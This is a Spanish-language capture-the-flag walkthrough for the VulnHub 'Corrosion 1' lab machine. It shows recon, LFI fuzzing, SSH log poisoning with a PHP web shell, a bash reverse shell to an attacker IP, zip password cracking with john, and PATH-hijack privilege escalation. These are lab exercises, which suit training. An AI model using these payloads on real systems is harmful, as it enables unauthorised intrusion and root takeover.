---
layout: single
title: Corrosion 1 - VulnHub
excerpt: " The goal of this capture the flag is to gain root access to the target machine. The difficulty level is marked as easy. As a hint, it is mentioned that enumerating properly is the key to solving this CTF. Prerequisites would be knowledge of Linux commands and the ability to run some basic pentesting tools."
date: 2023-02-07
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-corrosion1/corrosion1.jpeg
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - ssh
  - log
  - poisoning
  - john
  - LFI
---

The goal of this capture the flag is to gain root access to the target machine. The difficulty level is marked as easy. As a hint, it is mentioned that enumerating properly is the key to solving this CTF. Prerequisites would be knowledge of Linux commands and the ability to run some basic pentesting tools.

# Summary
- IP: 192.168.0.108
- Ports: 22,80
- OS: Linux (Ubuntu Bionic)
- Services & Applications:
	-  22 -> OpenSSH 8.4p1 Ubuntu 5ubuntu1
	-  80 -> Apache httpd 2.4.46

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.0.108 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,80 -sCV 192.168.0.108 -oN targeted
```


- Escaneo de directorios con gobuster:

```bash
$gobuster dir -u 192.168.0.108 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```

	- Enumeramos los directorios: "/tasks"  "/blog-post"

- Buscamos archivos o directorios dentro de "blog-post":

	- Enumeramos los directorios "/archives" "/uploads"


# Análisis de página web:

- En la página principal vemos la ventana por defecto de apache, en el directorio que encontramos en la fase de reconocimiento "/blog-post/archives" podemos visualizar un archivo "randylogs.php", lo abrimos y no podemos visualizar nada ni ver en que consiste.


# LFI a RCE con archivo php vulnerable:

- Fuzzeamos el archivo php que encontramos para comprobar si es vulnerable a LFI:

```bash
$wfuzz -c -u http://192.168.0.108/blog-post/archives/randylogs.php?FUZZ=/etc/passwd -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hl=0
```

- Obtenemos que el parámetro "file" devuelve más de 0 caracteres como respuesta, probamos introduciéndolo en la página y efectivamente nos arroja el contenido del archivo "/etc/passwd".

- Tratamos de convertir este LFI en RCE, primero buscando si existen logs SSH:

```
http://192.168.0.108/blog-post/archives/randylogs.php?file=/var/log/auth.log
```

- Vemos que si existe el archivo "auth.log" y podemos visualizarlo, aprovechamos esto para hacer un SSH log poisoning.

# SSH Log Poisoning:

- En la máquina atacante, intentamos loguearnos via SSH, introduciendo, en lugar de un usuario normal, código PHP el cual nos permita ejecutar comandos mediante el parámetro "get":

```
ssh '<?php system($_GET["cmd"]); ?>'@192.168.0.108
```

- Ahora, si recargamos la página que apunta al fichero "auth.log" y al final del link le concatenamos el ampersan y el parámetro cmd con cualquier comando, este se debería ejecutar y mostrarnos en pantalla el resultado:

```
view-source:http://192.168.0.108/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=ls -l /
```

- Con esto confirmamos el RCE y entablamos una reverse shell básica para ganar acceso al sistema; haciendo el respectivo tratamiento a la tty.

```
view-source:http://192.168.0.108/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.106/443 0>%261"
```

# ESCALANDO PRIVILEGIOS:

- Buscamos en el directorio "/var/backups" y vemos un archivo zip llamado "user_backup.zip" con permisos de lectura.

- Lo transferimos a nuestra máquina atacante y lo intentamos descomprimir; al ver que nos pide contraseña, la intentamos romper con John:

```bash
$zip2john user_backup.zip > pass.hash
$john -w:/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt pass.hash
```

- Obtenemos una contraseña; descomprimimos el archivo:

```bash
$unzip user_backup.zip
```

- Vemos un archivo con credenciales del usuario "randy" la usamos para pivotar a dicho usuario:

$su randy

- Buscamos permisos SUID y encontramos lo siguiente:

```
/home/randy/tools/easysysinfo
```

- Analizamos dicho binario con "strings" y nos damos cuenta que en parte del mismo ejecuta el binario "cat" mediante ruta relativa, lo cual podemos explotar con PATH hijacking, ya que el propietario del binario es root y tenemos permisos SUID:

```bash
$touch /tmp/cat
$chmod +x /tmp/cat
$nano /tmp/cat
```

```
chmod u+s /bin/bash
```

```
export PATH=/tmp:$PATH
```

- Ahora ejecutamos el binario y habremos otorgado permisos SUID a la bash:

```bash
$./easysinfo
```

- Ejecutamos la bash con privilegios y seremos root:

```bash
$bash -p
```
